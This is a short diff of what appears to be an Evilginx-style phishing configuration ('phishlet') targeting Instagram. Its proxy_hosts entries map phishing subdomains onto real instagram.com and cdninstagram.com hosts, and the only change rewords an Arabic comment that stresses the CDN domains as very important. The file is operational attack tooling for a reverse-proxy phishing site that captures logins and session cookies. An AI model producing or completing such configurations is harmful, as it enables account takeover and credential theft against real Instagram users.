@@ -6,7 +6,7 @@ proxy_hosts:
   - { phish_sub: 'help', orig_sub: 'help', domain: 'instagram.com' }
   - { phish_sub: 'about', orig_sub: 'about', domain: 'instagram.com' }
   - { phish_sub: 'blog', orig_sub: 'blog', domain: 'instagram.com' }
-  # إضافة نطاقات CDN الضرورية
+  # نطاقات CDN الأساسية (مهمة جداً)
   - { phish_sub: 'static', orig_sub: 'static', domain: 'cdninstagram.com' }
   - { phish_sub: 'scontent', orig_sub: 'scontent', domain: 'cdninstagram.com' }
   - { phish_sub: 'graph', orig_sub: 'graph', domain: 'instagram.com' }
